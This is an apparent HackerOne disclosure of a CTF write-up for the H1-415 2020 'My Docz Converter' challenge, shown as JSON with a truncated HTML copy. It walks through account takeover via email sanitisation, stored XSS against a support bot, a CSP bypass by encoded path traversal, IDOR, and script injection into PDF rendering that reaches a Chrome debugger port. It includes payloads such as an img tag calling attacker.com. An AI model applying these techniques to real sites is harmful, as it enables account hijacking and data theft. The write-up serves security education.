{"id":780285,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODAyODU=","url":"https://hackerone.com/reports/780285","title":"[h1-415 2020] H1-415 CTF Writeup by W--","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-22T10:20:55.303Z","submitted_at":"2020-01-22T10:20:55.303Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"w--","url":"/w--","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/085/811/0dfceabc7ae5e61845760d66293baf4bbf667b33_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-03T21:41:34.690Z","bug_reporter_agreed_on_going_public_at":"2020-02-03T21:41:34.639Z","team_member_agreed_on_going_public_at":"2020-02-03T20:34:56.857Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# H1-415 CTF Writeup \n\n## Intro\n\nHackerOne kicked off this year's H1-415 CTF with the following tweet:\n\n{F692033}\n\nLoading the target challenge website shows that the website is called `My Docz Converter`.  A quick look at the challenge website shows that it allows users to register an account and then upload an image to be converted to PDF.  My first thoughts were that there would likely be some type of template, script or command injection in the PDF generation process.  This ultimately turned out to be one of the last steps for this CTF!\n\n## Starting - No vulnerabilities yet!\n\nI got a somewhat late start on this CTF since I didn't see the challenge announcement until it was already a day in to the competition.  By that point there had already been two people who solved it, which I was hoping a sign that it wouldn't be *too* difficult overall!\n\nStarting a CTF challenge is often the hardest point since there's so many things to be explored, attempted, etc.  This challenge was no different.  The home page of the challenge website redirects to `/login`.  The login page then shows that you can either log in, or register an account if you need one.  To log in an email and password is needed - and the API call makes use of a CSRF token.  To register a name, email, username, and password is needed.    The registration page also notes: `This is a trial version. Your account will be disabled after a while.`.\n\nAfter registering an account images can be converted into PDF's and then viewed on the documents page.  The PDF includes a \"trial\" notice and our user's name.  There is also a link to `Support`, but the website notes that `Support chat is available for customers only`.  This seems like an obvious hint or future target.  If only we could be a real customer like Jobert....\n\n{F692041}\n\n## First vulnerability\n\nBefore hitting on the first vulnerability it's worth noting that I attempted a variety of things:\n\n- Cross site scripting in the username: No\n- Template injection in the PDF via username: No\n- Upload SVG's instead of PNG / JPG: No\n- Register the same username as someone else: No\n- Edit the profile of a different user ID: No\n- QR codes - so many QR codes: No\n- Others: No\n\nAt this point there were still many additional things to try, however I noticed that the first hint for this CTF had been posted:\n{F692050}\n\nThis first hint was actually *2* hints in one.  I had seen Jobert's testimonial on the challenge site login page initially, but did not think anything of it.  Going back to it, the hint is obvious:\n{F692055}\n\nWe can see there is a property `data-email` with the value `jobert@mydocz.cosmic`.  As far as I know `.cosmic` isn't a valid TLD, so our only use for this email was going to be on the challenge website.  To confirm this, I attempted to register an account with `jobert@mydocz.cosmic` as my listed email address.  Sure enough, the server reported an error indicating that the email was already in use.\n\nThat leads to the second part of the hint: `Can anyone here help us with some regex`.  It was this second part of the hint that was the biggest help.  When registering an account normally I had observed two behaviours:\n\n1) Special characters are silently stripped from the `Name` and `Username` fields\n2) QR recovery codes contain details for the account registered\n\nWhen registering `demo@demo.com` as a user account, for example, the following QR recovery code is given:\n\n{F692062}\n\nThis code decodes to (using any QR code decoder):\n\n````\n64656d6f4064656d6f2e636f6d:0f31a3904e808a832c2cef2bdfab06b7168ff6103637a14c72ca72cb31784644056ea258f8f81999d5d87a2c3ea7ef2903c857ac2e4daef6eaf8c99d6264a6976d8ee331f68a0d5b5b8bf75a7324e63c2e7322d81104d6c2b5acbbeafb4d91f6515867767f661d352bfcbe19a9579cfa194f7e4708696acffe1d07927a6905ff\n```\n\nThe first part is `64656d6f4064656d6f2e636f6d`.  Converting this from `hex` to `ascii` shows our email `demo@demo.com`.  The hint says we need to figure out a regex for Jobert's email that we have discovered.  After a couple failed tries at inserting whitespace at the end of the email to register with I realized that we can use the server's special character deletion behaviour to our advantage.  Here's the steps:\n\nFirst: register a new account.  In the email field we need to include special characters, but these are blocked by client side Javascript.  Burp Suite Pro easily solves that for us.  We can simply edit the raw `POST` request to the `/register` endpoint to contain these special characters.  For example:\n\n```\nPOST /register HTTP/1.1\nHost: h1-415.h1ctf.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 153\nCookie: _csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384; session=eyJfY3NyZl90b2tlbiI6IjQwNzg0OWViZTE2YWRlMWNmYTk5ODhlMjQ5MTY1Y2U4ZWMxMWUzODQiLCJjaGF0IjpbXSwiZW1haWwiOiJmYWtlQGZha2U4OC5jb20iLCJ1c2VyX3R5cGUiOjN9.XiebQg.uxyF3T2cF7YDXjmsiDhJWJnrmUA\n\nname=demo\u0026email=jobert%40mydocz.cosmic\u003c\u003c\u003c\u0026username=demo\u0026password=password123\u0026password-confirmation=password123\u0026_csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384\n```\n\nIn the above `POST` request we use `jobert%40mydocz.cosmic\u003c\u003c\u003c` instead of `jobert%40mydocz.cosmic`.  My first try at this failed and threw me off for a bit.  It turns out that someone else had already registered `jobert%40mydocz.cosmic\u003c\u003c\u003c`!\n\nNow we're ready for the second step: At this point we have an account registered with a variation of Jobert's email, but nothing more.  As soon as we register the account we are given a QR recovery code however.  We can save this code and log out.  Now we access the account recovery page at `/recover`.  When we upload the QR code it will contain the email `jobert@mydocz.cosmic\u003c\u003c\u003c`.  This will be sanitized down to `jobert@mydocz.cosmic` and is otherwise a valid recovery code so access is granted.  At last we now have access Jobert's account!\n\n{F692075}\n\n## First vulnerability - TLDR\n\n1) Our target account is `jobert@mydocz.cosmic` as hinted at on the login page.\n2) The `/register` API will allow special characters at the end of an email address. \n3) Most other API's on this server silently remove any special characters from the input.  We can leverage this behaviour to register a variation on the target email like `jobert@mydocz.cosmic\u003c\u003c\u003e\u003e\u003c\u003c\u003c`\n4) After successfully registering, the \"recovery\" QR code can be used with the `/recover` API.  The special characters in the input email will be removed during the API processing, resulting in access to the `jobert@mydocz.cosmic` account.\n\n## Second vulnerability\n\nEven thought we now have access to Jobert's account, there are no documents listed in this account on the `Documents` page so it appears that more steps will be needed to complete this challenge.  Since everyone working on the CTF is sharing this server, making changes to Jobert's account are disabled.  This includes uploading documents or changing profile details.  Not being able to access any of these functions helps narrow down where we should look for the next vulnerability.  Unlike any regular accounts that can be registered, Jobert's account has access to the `/support` page.\n\nOn the support page, a \"chatbot\" style interface loads.  Similar to real life customer service chatbots, this interface responds with random nonsense for every input that is given.  I immediately noticed that this support page is vulnerable to an XSS attack.  User input isn't sanitized in any way, it's just printed out to the page.  Even though self-XSS is great for bounty programs (just kidding...), it doesn't immediately help us here.\n\nEach message you input to the chatbot is passed as a `GET` request to the following API:\n\n```\n/support/chat?message=\u003cinput\u003e\n```\n\nThe server then responds with a JSON encoded message.  Testing did not show anything promising for the input being entered.  What *was* noticeable however was that a new cookie value is set after each call to this API, and the length of the cookie value named `session` would vary depending on both the user input *and* the server output.\n\nExamining the `session` cookie values showed that they appear to be `Base64` encoded, and they would always start with the same few characters: `eJw9y0...`.  This led to a fair amount of time unsuccessfully spent trying to decode/decrypt this cookie value.  It turns out that there is no need to actually gain access to this cookie parameter.\n\nLooking for what I might be missing with the session token decryption I notice that there was a *fairly obvious* additional function in the chat bot.  The Javascript client side script for the support function is loaded from `/js/support.min.js`.  Reviewing this file shows the following line:\n\n```\nif(\"finish\"!==t.toLowerCase()\u0026\u0026\"quit\"!==t.toLowerCase())\n```\n\nTyping either of those words in as input to the chatbot displays a dialog for submitting feedback:\n\n{F692168}\n\nClicking submit on this dialog causes a `POST` request to be made to `/support/feedback`.  This request includes a parameter named `rating`, and a CSRF token.  Further testing of the feedback API showed that if a rating of 2, 3, 4, or 5 stars was given, the server response would be:\n\n```\nThank you for your review!\n```\n\nBut if only 1 star was given as a rating (and passed to the feedback API), the response would instead be:\n\n```\nThank you for your review! Our team will review it shortly.\n```\n\nThis clue gives away what we'll need to do for our next vulnerability - we need to enter some sort of malicious input for the \"support team\" to review.  Since we know there's a XSS vulnerability in the support page it seems like there's a good chance it will affect the feedback review page too.  It also then makes sense why the `session` cookie value was being updated to include our user input: The feedback API will make use of our session cookie and load our chat session input from it.\n\nTo confirm this vulnerability I entered an image tag as part of my support chat input, and set the path to an external server I controlled:\n\n```\n\u003cimg src=http://attacker.com/aaaaaa/\u003e\n```\n\nI then called the feedback API giving my support session a 1 star rating.  Sure enough, on my external server I saw the request for the image come through:\n{F692182}\n\nThis confirmed a HTML injection and potential XSS on the support page.  Getting a working XSS was the next step.\n\n## Second vulnerability - TLDR\n\n1) From Jobert's account access the `/support` page.\n2) Leverage the HTML injection / XSS on the support page by passing in HTML tags to the support chat.  For example, use an image tag that references an external server.\n3) Type in `finish` or `quit` to display the \"Feedback\" dialog. \n4) Mark your support session feedback as a 1 star rating to trigger the \"support team\" to \"review\" it.\n5) A copy of the input from the support chat will be rendered on the support agent's browser, which turns out to just be a script running headless Chrome.  Our image tag will load, causing an external HTTP request to be made confirming this vulnerability path.\n\n## Second vulnerability - Part 2\n\nGetting the first part of this vulnerability working was actually fairly trivial except for the fact that I initially missed the feedback dialog option.  With the ability to cause arbitrary HTML content to sent to the \"support team\", it seemed pretty clear that we would need to take over their session to gain additional privileges on the `My Docz` system.  To take over a session though, we would almost certainly need Javascript execution.\n\nBack at the support chat page, I noticed that while it appeared I had a XSS vulnerability, my browser wasn't actually executing any Javascript payloads.  Instead, all Javascript was being blocked due to the server's Content Security Policy (CSP).  Looking at the response headers, the following CSP rules are set by the server:\n\n```\nContent-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *\n```\n\nThe `default-src` policy means that anything not otherwise listed will also be set to `self`.  In the world of CSP, `self` doesn't mean \"accept anything on the webpage\", it instead means \"do not run any script content that is included directly on the page, only accept scripts hosted on this server\".  In other words, all the Javascript files hosted in under `https://h1-415.h1ctf.com/` could be loaded fine, but attempting to add our own Javascript content directly on the support chat page would fail.\n\nThe one addition in the CSP apart from `self` is the `script-src` value of `https://raw.githack.com/mattboldt/typed.js/master/lib/`.  This seemed like an odd addition to the CSP rules since all other Javascript is referenced from scripts directly hosted on the challenge website.  Since the whole directory `/mattboldt/typed.js/master/lib` is allowed according to the CSP, I checked to see what other scripts could be referenced.  This turned out to be a dead end, nothing else of value was in the directory:\n{F692198}\n\nThe second unusual thing about this CSP rule was that normally a base domain is whitelisted, not a full URL path.  This was new to me, so I spent some time on Google to determine how fully qualified URLs and paths are handled in CSP rules.  This turned out to be way more frustrating than expected.  For example, the following page is a common reference for CSP details:\n\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy\n\nLooking through the whole page, there is no mention at all of how paths are handled.  So I moved on to testing Chrome's CSP behaviour myself.  This showed that:\n\n- If the CSP includes a full URL, Chrome will treat any content under that URL path (any file or subdirectory) as allowed.\n- Chrome will block anything in parent directories or the base server.\n- Paths are \"normalized\" before evaluating, meaning that simply path traversals are blocked.\n\nWhile attempting a basic path traversal against the CSP policy failed, it made me wonder how Chrome would have any idea whether or not a path traversal was taking place.  Testing showed that Chrome evaluates the \"resulting\" path the same way as when you're entering an URL in the address bar.  If I enter `http://exfiltrated.com/url/demo/../test` in my browser, the URL that Chrome will request will be `http://exfiltrated.com/url/test`. \n\nThis led to the next obvious thing to try, _URL encoding the path_ to prevent it from being normalized.  If you've ever made URL encoded requests to a web server you will know that *servers* often do not care if a path is URL encoded, they will first decode your requested path and then attempt to load your page.  For CSP's I quickly discovered that Chrome would appear to know that `%2e` was the same as `.`, but it would not decode `%2f` as `/`.  This means that Chrome CSP parser *would* accept the following URL:\n\n```\nhttps://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fmyuser/myproject/master/attacker.js\n```\n\nI quickly tested to see how the Githack server would handle this style of request and it turns out to happily parse our URL encoded path, follow the traversal, and give us our target page!  This means we can finally bypass the CSP policy on this website by hosting our own Javascript on Github and then using a path traversal to reference that script.  Note that githack.com is basically just a proxy service for Github, so having our own content hosted on that domain is as simple as making a new Github repository.\n\nTo reference the Github hosted script on the support page I used the following for the message contents:\n\n```\n\u003cscript src=\"https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fw--/a/master/csp-done19.js\"\u003e\u003c/script\u003e\n```\n\nNote that our %2f path is URL encoded twice - once for the original `/support` page to decode, and once to bypass the CSP policy on the support team bot's browser.  A hint / Easter egg at this point is that any time you include a script tag in your message to the support chat the response is:\n\n```\nWow, that's cosmic.\n```\n\nI'm not sure if a \u003cscript\u003e tag is truely cosmic brain, but it's on the right path :)  \n\nTriggering this message to be reviewed by the support team bot finally resulted in a successful XSS attack!  Unfortunately I ended up being stuck here for a couple hours due to instability on the challenge server, and a couple bugs in my Javascript.  The challenge server would restart hourly (at 35 minutes past the hour), but between the restarts it would sometimes end up in bad states.  One of these was the state where the `/support/feedback` API wouldn't actually trigger the support chat being loaded by the support team bot.  This was simple enough to debug, but ultimately took a while.\n\nWith full XSS access I started to look into how we could leverage the support team bot's session.  Unfortunately session cookies were set to `httponly` so only the `csrf` token could be retrieved from the cookies.  After spending some time looking at the page details that was loaded on the support bot browser I eventually looked up the `window.location` value.  This showed that the URL the support bot was accessing the chat log from was:\n\n```\nhttp://localhost:3000/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb \n```\n\nRather than attempting to make requests to this via `XMLHttpRequest's`, I tried the following URL in my browser:\n\n```\nhttps://h1-415.h1ctf.com/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb \n```\n\n...and it worked!  Our support chat session is loaded, along with some additional user details.\n{F692380}\n\n## Second vulnerability - Part 2 - TLDR\n\n1) A CSP is blocking all script execution.\n2) The `script-src` rule allows scripts from `https://raw.githack.com/mattboldt/typed.js/master/lib/`.\n3) We can abuse the allowed path by URL encoding our script path.  Use `%2f` instead of `/` to perform a directory traversal server-side, but trick Chrome into thinking we are still referencing a valid path.  For example: `https://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fmyuser/myproject/master/attacker.js`.\n4) In our attacker Javascript we need to read the `window.location` property to find the magic URL that will give us access to the support feedback review page.\n\n## Third vulnerability \n\nHaving access to the support feedback review page at first only appears to give access to a copy of our own messages.  It also shows Jobert's profile details, but we *also* already have access to those.  This page, just like the `/settings` page examined earlier also does not let us change Jobert's details.  The only new item appears to be the `Ban User` button.  \n\nExamining the `Ban User` button showed that it is disabled *and* no Javascript appears to exist to handle any actions if it were enabled.  The `Save` button causes a `POST` request to the `/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb` URL instead of the normal `/settings` URL, but otherwise appeared the exact same.\n\nOne of the things I noticed on the `/settings` page as a regular user is that the request includes a parameter `user_id`, which is just a numeric value.  The same parameter is passed when the `/support/review/417e9e5a4793077f7070b9d214e7db44839f89dcdcee6e5c0616ae4c212d22bb` API is accessed.  As a test, I changed this to a random number, and unlike on the `/settings` API this worked.  To confirm, I registered a new user account and looked up the `user_id` value on the `/settings` page.  Then I made a change via the support page to my test user.  Sure enough, the changes took effect.\n\nRight from the beginning of this challenge it felt like abusing the PDF generation should be part of the CTF, so the first thing I tried was to include special characters in the `name` field when updating via the support page.  This time it worked!\n\nTrying template injection attacks like `{{7*7}}` and `${7*7}` was not successful.  Including HTML tags however *was* successful and these rendered inside the PDF.  Since the `name` field length was limited I attempted to reference an external Javascript page source.  This time no CSP policy blocked the script and I could directly load Javascript from any URL!\n\nAt this point I started enumerating details about the PDF generation page.  The URL the page was called from was:\n\n```\nhttp://localhost:3000/converter/bd0bde8f600a8a6df01ed973809cc7bc4e487a00212df0085ec6ef4f4deb42a9?user_name=demo\n```\n\nUnlike on the second vulnerability, accessing this URL was not possible via the `https://h1-415.h1ctf.com/` website - a error `403` would be returned.  After trying a lot of things I scripted outputting all of the `document` object properties.  This unfortunately did not give any more clues.  During this process however I did observe that I could easily extract page outputs, even across other websites by including a `\u003ciframe\u003e` tag.  The PDF would render and display the `iframe` contents.  This led to a lot of failed attacks:\n\n- Access other internal network hosts\n- Find an accessible page on the webserver on localhost running on port 80 (as opposed to 3000)\n- Find a page on port 3000 that the PDF rendering system could access\n- Access the local filesystem via `file://`\n\nA variety of other CTF's in the past have included challenges where reading files via the `file://` handler was required.  Checking into the Chrome policies for this however showed that no access to pages on `file://` is allowed *at all* unless the parent page is also loaded from a `file://` path:\n\n{F692405}\n\nLooking at options for loading files from Chrome however led to a reference to the Chrome debugger, which for headless version of Chrome especially is often enabled.  On the second vulnerability and on this one the user agent indicated that headless Chrome was in use, so this seemed like a good possibility.  By default, the debugger port in on `9222`.  To check if this was accessible the following script code was used:\n\n```\ndocument.write(\"\u003chr\u003e\u003ciframe src='http://localhost:9222/' width='900' height='1000'\u003e\u003c/iframe\u003e\");\n```\n\nSure enough it *was* accessible.  The default page doesn't show much, so the next page I checked was `http://localhost:9222/json`.  Finally this revealed what was needed:\n{F692408}\n\nAs we can see in the output, on another tab / window a page with the following URL was open:\n\n```\nhttp://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\n```\n\n## Third vulnerability - TLDR\n\n1) The support chat review page allows for review support chats *and* for updating user account properties\n2) From the support review page, *any* user account can be updated (just not Jobert's account!)\n3) The support review page *also* does not strip special characters, allowing for HTML to be injected into a user's name field\n4) The user's name field is rendered in the PDF when an image is converted.  If it contains HTML it will be parsed and rendered as HTML content\n5) A script tag can be injected including remote scripts to get around any length restrictions for the HTML injection\n6) Using a script we can inject an `\u003ciframe\u003e` into the PDF output.  This can be used to load a view of the Chrome debugger on port `9222`\n7) Inspect the open pages via the Chrome debugger's `/json` endpoint to discover the secret document URL.\n\n## Jobert's Missing Document\n\nAt long last we have the magic hash for Jobert's lost document.  Testing previously showed that access to document URL's are not restricted, they are simply protected by each having a unique hash.  This meant that we could access the missing document simply by accessing:\n\n```\nhttps://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab\n```\n\nThis gives the document including the flag:\n\n```\nh1ctf{y3s_1m_c0sm1c_n0w}\n```\n\nIt would only be fitting to make a meme for this, so here's my attempt:\n{F692449}\n\n## Impact\n\nDoes anyone else wonder if this was the inspiration for this CTF?: https://hackerone.com/reports/745324","vulnerability_information_html":"\u003ch1 id=\"h1-415-ctf-writeup\"\u003eH1-415 CTF Writeup\u003c/h1\u003e\n\n\u003ch2 id=\"intro\"\u003eIntro\u003c/h2\u003e\n\n\u003cp\u003eHackerOne kicked off this year\u0026#39;s H1-415 CTF with the following tweet:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"start-tweet.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pRF1oJPgDKEaKQbsSu4xuM6u?response-content-disposition=attachment%3B%20filename%3D%22start-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27start-tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=75e82451a9996a9498bd985366f079d31dc5b50a05ad28b5744994ceb49de970\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/pRF1oJPgDKEaKQbsSu4xuM6u?response-content-disposition=attachment%3B%20filename%3D%22start-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27start-tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=75e82451a9996a9498bd985366f079d31dc5b50a05ad28b5744994ceb49de970\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eLoading the target challenge website shows that the website is called \u003ccode\u003eMy Docz Converter\u003c/code\u003e.  A quick look at the challenge website shows that it allows users to register an account and then upload an image to be converted to PDF.  My first thoughts were that there would likely be some type of template, script or command injection in the PDF generation process.  This ultimately turned out to be one of the last steps for this CTF!\u003c/p\u003e\n\n\u003ch2 id=\"starting-no-vulnerabilities-yet\"\u003eStarting - No vulnerabilities yet!\u003c/h2\u003e\n\n\u003cp\u003eI got a somewhat late start on this CTF since I didn\u0026#39;t see the challenge announcement until it was already a day in to the competition.  By that point there had already been two people who solved it, which I was hoping a sign that it wouldn\u0026#39;t be \u003cem\u003etoo\u003c/em\u003e difficult overall!\u003c/p\u003e\n\n\u003cp\u003eStarting a CTF challenge is often the hardest point since there\u0026#39;s so many things to be explored, attempted, etc.  This challenge was no different.  The home page of the challenge website redirects to \u003ccode\u003e/login\u003c/code\u003e.  The login page then shows that you can either log in, or register an account if you need one.  To log in an email and password is needed - and the API call makes use of a CSRF token.  To register a name, email, username, and password is needed.    The registration page also notes: \u003ccode\u003eThis is a trial version. Your account will be disabled after a while.\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eAfter registering an account images can be converted into PDF\u0026#39;s and then viewed on the documents page.  The PDF includes a \u0026quot;trial\u0026quot; notice and our user\u0026#39;s name.  There is also a link to \u003ccode\u003eSupport\u003c/code\u003e, but the website notes that \u003ccode\u003eSupport chat is available for customers only\u003c/code\u003e.  This seems like an obvious hint or future target.  If only we could be a real customer like Jobert....\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"support-page.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YV5vArCXCBL2HWnqN7MjJBT2?response-content-disposition=attachment%3B%20filename%3D%22support-page.png%22%3B%20filename%2A%3DUTF-8%27%27support-page.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl